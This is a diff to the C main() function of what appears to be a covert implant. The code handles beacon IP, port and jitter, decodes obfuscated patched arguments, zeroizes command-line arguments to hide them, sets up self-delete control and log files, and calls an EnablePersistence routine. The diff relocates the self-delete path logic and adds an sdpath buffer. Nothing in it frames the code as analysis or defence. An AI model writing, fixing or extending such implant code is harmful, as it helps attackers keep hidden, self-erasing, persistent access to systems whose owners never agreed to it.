@@ -5,6 +5,7 @@
 #define _INC_STAT_INL
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <unistd.h>
 #include <limits.h>
 
 //String encoding handled via the next 3 included files...
@@ -127,6 +128,7 @@ int main(int argc, char** argv)
 	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
 	float			jitter = DEFAULT_BEACON_JITTER * 0.01f;
 	int				retVal = 0;
+	char			sdpath[SD_PATH_LENGTH] = {0};
 	FILE			*f;
 	struct stat 	st;
 #ifndef DEBUG
@@ -187,8 +189,7 @@ int main(int argc, char** argv)
 	);
 #endif
 
-	if ( args.patched == 1 )
-	{
+	if (args.patched == 1) {
 		// binary was patched
 		// all patched times should be already be in milliseconds
 		DLX(1, printf("Binary was patched with arguments\n"));
@@ -202,6 +203,7 @@ int main(int argc, char** argv)
 		trigger_delay = args.trigger_delay;
 		delete_delay = args.delete_delay;
 		jitter = args.jitter * 0.01f;
+		memcpy(sdpath, args.sdpath, SD_PATH_LENGTH * sizeof(char));
 
 	//	cl_string( (unsigned char *)args.beacon_ip, sizeof( args.beacon_ip ) );
 		cl_string( (unsigned char *)args.beacon_ip, args.host_len );
@@ -210,14 +212,9 @@ int main(int argc, char** argv)
 
 		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
 		DLX(1, printf( "\tDecoded patched value for interface: %s\n", szInterface));
-
-		cl_string((unsigned char *)args.sdpath, sizeof( args.sdpath ) );
-		strncpy(sdcfp, args.sdpath, strlen(args.sdpath));
-		if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
-			strcat(sdcfp, "/");
-		strncat(sdcfp, (const char *)sdc, strlen((const char*)sdc));
-		strncpy(sdlfp, optarg, strlen(optarg));
-		strncat(sdlfp, (const char*)sdl, strlen((const char *)sdl));
+		cl_string((unsigned char *)sdpath, sizeof(sdpath));
+		DLX(1, printf( "\tDecoded sdpath: %s\n", sdpath));
+		strncpy(sdcfp, sdpath, strlen(sdpath));
 
 		goto okay;
 	}
@@ -354,35 +351,6 @@ int main(int argc, char** argv)
 		}
 	}
 
-    // Construct self delete control and log files with full path names
-
-	if (strlen((const char *)sdcfp) == 0) {
-			strcpy(sdcfp, (const char *)sddp);
-	}
-
-	if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
-		strcat(sdcfp, "/");
-	strcpy(sdlfp, sdcfp);				// Duplicate the path for the log file
-	strcat(sdcfp, (const char *)sdc);	// Add .control filename
-	strcat(sdlfp, (const char *)sdl);	// Add .log filename
-
-	DLX(1, printf("Control file: \"%s\"\n", sdcfp));
-	DLX(1, printf("    Log file: \"%s\"\n", sdlfp));
-
-	if (stat((char *)sdcfp, &st ) != 0) {
-		DLX(1, printf("\"%s\" does not exist, creating it\n", (char *)sdcfp));
-
-		f = fopen( (char *)sdcfp,"w" );
-		if ( f == NULL ) {
-			DLX(1, perror("fopen()"));
-			DLX(1, printf("\tCould not create file %s\n", (char *)sdcfp));
-			exit(0);
-		}
-		fclose(f);
-	} else {
-		DLX(1, printf("\"%s\" file already exists\n", (char *)sdcfp ));
-	}
-
 	// process environment variables, if needed
 	
 	//validate user input
@@ -433,8 +401,37 @@ int main(int argc, char** argv)
 	// for Linux and Solaris, zeroize command line arguments
 	clean_args(argc, argv, NULL);
 
-// if the binary has been patched, we don't need to parse command line arguments
-okay:
+
+okay:	// if the binary has been patched, we don't need to parse command line arguments
+
+	// Construct self delete control and log files with full path names
+	if (strlen((const char *)sdcfp) == 0) {
+			strcpy(sdcfp, (const char *)sddp);
+	}
+
+	if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
+		strcat(sdcfp, "/");
+	strcpy(sdlfp, sdcfp);				// Duplicate the path for the log file
+	strcat(sdcfp, (const char *)sdc);	// Add .control filename
+	strcat(sdlfp, (const char *)sdl);	// Add .log filename
+
+	DLX(1, printf("Control file: \"%s\"\n", sdcfp));
+	DLX(1, printf("    Log file: \"%s\"\n", sdlfp));
+
+	if (stat((char *)sdcfp, &st ) != 0) {
+		DLX(1, printf("\"%s\" does not exist, creating it\n", (char *)sdcfp));
+
+		// TODO: Self-delete if this file cannot be opened for writing and use an exit code that's meaningful. (Review exit codes.)
+		f = fopen( (char *)sdcfp,"w" );
+		if ( f == NULL ) {
+			DLX(1, perror("fopen()"));
+			DLX(1, printf("\tCould not create file %s\n", (char *)sdcfp));
+			exit(0);
+		}
+		fclose(f);
+	} else {
+		DLX(1, printf("\"%s\" file already exists\n", (char *)sdcfp ));
+	}
 
 	if ( args.patched == 1 ) {
 		retVal = EnablePersistence(beaconIP,beaconPort);
